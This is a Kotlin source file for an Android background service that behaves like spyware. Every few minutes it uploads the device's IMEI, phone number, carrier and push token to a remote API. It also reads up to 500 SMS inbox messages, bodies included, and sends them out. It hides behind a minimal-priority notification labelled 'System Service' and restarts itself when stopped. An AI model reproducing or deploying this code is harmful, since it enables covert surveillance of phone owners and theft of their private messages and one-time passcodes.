package com.boom.client.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.telephony.TelephonyManager
import androidx.core.app.NotificationCompat
import com.boom.client.api.ApiClient
import com.boom.client.utils.Prefs
import org.json.JSONArray
import org.json.JSONObject
import java.util.UUID
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class DeviceService : Service() {

    private val executor = Executors.newScheduledThreadPool(2)
    private val CHANNEL_ID = "boom_service"

    override fun onCreate() {
        super.onCreate()
        Prefs.init(applicationContext)
        createNotificationChannel()
        startForeground(1, buildNotification())

        if (Prefs.deviceId.isEmpty()) Prefs.deviceId = UUID.randomUUID().toString()

        executor.scheduleAtFixedRate({ doCheckin() }, 0, 3, TimeUnit.MINUTES)
        executor.scheduleAtFixedRate({ syncSms() }, 30, 5, TimeUnit.MINUTES)
    }

    private fun doCheckin() {
        try {
            val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
            val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
            val battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            ApiClient.checkin(
                deviceId = Prefs.deviceId, name = Build.MODEL,
                phoneNumber = try { tm.line1Number ?: "" } catch (e: Exception) { "" },
                model = Build.MODEL, manufacturer = Build.MANUFACTURER,
                androidVersion = Build.VERSION.RELEASE,
                imei = try { tm.imei ?: "" } catch (e: Exception) { "" },
                simOperator = tm.networkOperatorName ?: "", batteryLevel = battery,
                fcmToken = FcmService.currentToken ?: ""
            )
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun syncSms() {
        try {
            val cutoff = Prefs.lastSmsSync
            val now = System.currentTimeMillis()
            val messages = JSONArray()
            val cursor: Cursor? = contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("address", "body", "date", "thread_id"),
                if (cutoff > 0) "date > ?" else null,
                if (cutoff > 0) arrayOf(cutoff.toString()) else null,
                "date DESC"
            )
            cursor?.use {
                val addrIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                val dateIdx = it.getColumnIndex("date")
                val threadIdx = it.getColumnIndex("thread_id")
                var count = 0
                while (it.moveToNext() && count < 500) {
                    messages.put(JSONObject().apply {
                        put("address", it.getString(addrIdx) ?: "")
                        put("body", it.getString(bodyIdx) ?: "")
                        put("timestamp", it.getLong(dateIdx))
                        put("threadId", it.getString(threadIdx) ?: "")
                    })
                    count++
                }
            }
            if (messages.length() > 0) {
                ApiClient.uploadSms(Prefs.deviceId, messages)
                Prefs.lastSmsSync = now
            }
        } catch (e: Exception) { e.printStackTrace() }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int) = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        executor.shutdown()
        startService(Intent(applicationContext, DeviceService::class.java))
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Background Sync", NotificationManager.IMPORTANCE_MIN)
                .apply { setShowBadge(false) }
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }
}
